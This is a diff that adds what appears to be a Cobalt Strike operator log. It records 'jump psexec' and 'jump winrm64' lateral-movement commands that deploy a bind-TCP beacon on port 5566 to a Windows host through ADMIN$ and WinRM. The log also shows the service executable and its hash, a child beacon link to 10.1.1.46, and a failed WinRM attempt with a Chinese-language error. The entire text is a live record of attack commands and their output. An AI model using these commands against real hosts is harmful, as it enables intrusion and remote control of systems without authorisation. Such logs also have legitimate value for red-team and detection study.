@@ -1,0 +1,20 @@
+12/04 07:45:44 UTC [input] <kali> jump psexec WIN-AULIRDQ5FPP 
+12/04 07:46:19 UTC [input] <kali> jump psexec64 WIN-AULIRDQ5FPP 456
+12/04 07:46:19 UTC [task] <T1035, T1050, T1077> Tasked beacon to run windows/beacon_bind_tcp (0.0.0.0:5566) on WIN-AULIRDQ5FPP via Service Control Manager (\\WIN-AULIRDQ5FPP\ADMIN$\6c704d5.exe)
+12/04 07:46:19 UTC [indicator] service: \\WIN-AULIRDQ5FPP 6c704d5
+12/04 07:46:19 UTC [indicator] file: c940a2260bf9f18f676c9be6ce8236d5 289280 bytes \\WIN-AULIRDQ5FPP\ADMIN$\6c704d5.exe
+12/04 07:46:20 UTC [checkin] host called home, sent: 291440 bytes
+12/04 07:46:22 UTC [error] could not upload file: 53
+12/04 07:46:22 UTC [error] Could not start service 6c704d5 on WIN-AULIRDQ5FPP: 2
+12/04 07:46:23 UTC [output]
+established link to child beacon: 10.1.1.46
+
+12/04 08:17:01 UTC [input] <kali> jump winrm64 WIN-AULIRDQ5FPP 456
+12/04 08:17:01 UTC [task] <T1028, T1086> Tasked beacon to run windows/beacon_bind_tcp (0.0.0.0:5566) on WIN-AULIRDQ5FPP via WinRM
+12/04 08:17:01 UTC [checkin] host called home, sent: 219419 bytes
+12/04 08:17:22 UTC [error] Could not connect to target
+12/04 08:17:23 UTC [output]
+received output:
+#< CLIXML
+<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04"><S S="Error">[win-aulirdq5fpp] 连接到远程服务器失败，错误消息如下: WinRM 客户端无法处理该请_x000D__x000A_</S><S S="Error">求。如果身份验证方案与 Kerberos 不同，或者客户端计算机未加入到域中， 则必须使用_x000D__x000A_</S><S S="Error"> HTTPS 传输或者必须将目标计算机添加到 TrustedHosts 配置设置。 使用 winrm.cmd 配_x000D__x000A_</S><S S="Error">置 TrustedHosts。请注意，TrustedHosts 列表中的计算机可能未经过身份验证。 通过运_x000D__x000A_</S><S S="Error">行以下命令可获得有关此内容的更多信息: winrm help config。 有关详细信息，请参阅 _x000D__x000A_</S><S S="Error">about_Remote_Troubleshooting 帮助主题。_x000D__x000A_</S><S S="Error">    + CategoryInfo          : OpenError: (:) [], PSRemotingTransportException_x000D__x000A_</S><S S="Error">    + FullyQualifiedErrorId : PSSessionStateBroken_x000D__x000A_</S></Objs>
+
